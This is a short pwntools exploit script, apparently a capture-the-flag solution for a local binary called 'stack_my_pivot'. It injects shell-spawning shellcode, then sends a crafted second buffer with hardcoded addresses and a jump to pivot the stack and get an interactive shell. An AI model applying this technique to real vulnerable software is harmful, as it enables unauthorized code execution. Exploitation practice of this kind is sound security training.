#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./stack_my_pivot')

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')
p.send(first_input)

second_input  = b'\x90' * 8
second_input += p64(0x400738)
second_input += b'\xeb\xa6'
second_input += b'\x90' * 6
second_input += p32(0x40072e)

print(f"Second input length: {len(second_input)}")
print(f"Bytes [24:28]: {second_input[24:28].hex()}")

p.send(second_input)

time.sleep(0.5)
p.sendline(b'id')
p.interactive()
